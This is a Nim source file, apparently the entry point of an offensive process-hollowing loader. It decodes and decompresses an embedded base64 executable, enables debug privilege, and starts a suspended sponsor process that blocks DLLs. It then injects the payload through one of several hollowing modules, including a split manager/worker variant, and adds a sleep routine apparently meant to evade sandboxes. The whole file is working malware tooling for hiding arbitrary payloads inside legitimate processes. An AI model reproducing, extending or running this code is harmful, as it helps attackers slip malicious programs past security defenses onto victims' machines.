# Internal
import utils
import params
# External
import os
import winim
import strutils
from std/base64 import decode
from zip/zlib import uncompress

# Import per module chosen
when defined(hollow1):
    import hollow1
when defined(hollow2):
    import hollow2
when defined(hollow4):
    import hollow4


proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), isBlockDlls: bool, sleepSeconds: int = 0): bool =
    
    # Enable debug privilege
    discard setDebugPrivilege()

    # Decode and decompress PE
    var compressedPe = decode(compressedBase64PE)
    var peStr = uncompress(compressedPe)

    # Check hollowsplitted args 
    when defined(hollow4):
        let commandLineParams = commandLineParams()
        for i in commandLineParams:
            if i.startsWith("-A:") or i.startsWith("-W:") or i.startsWith("-T:") or i.startsWith("-R:"):
                # This is a worker process in splitted hollow, let it go
                return hollow4Worker(peStr)
        if not ("-M" in commandLineParams):
            quit(1)

    # Sleep at execution
    sleepUselessCalculations(sleepSeconds)
    
    # Create suspended process with extended attributes (block dll's)
    var ppi: PPROCESS_INFORMATION = createSuspendedExtendedProcess(sponsorCmd, isBlockDlls)

    # Execute module
    when defined(hollow1):
        return hollow1(peStr, ppi)
    when defined(hollow2):
        return hollow2(peStr, ppi)
    when defined(hollow4):
        return hollow4Manager(peStr, ppi)


proc main*() =
    discard execute(
        compressedBase64PE = compressedBase64PE, 
        sponsorCmd = sponsorPath & sponsorParams,
        isBlockDlls = isBlockDlls,
        sleepSeconds = sleepSeconds
    )


when isMainModule:
    main()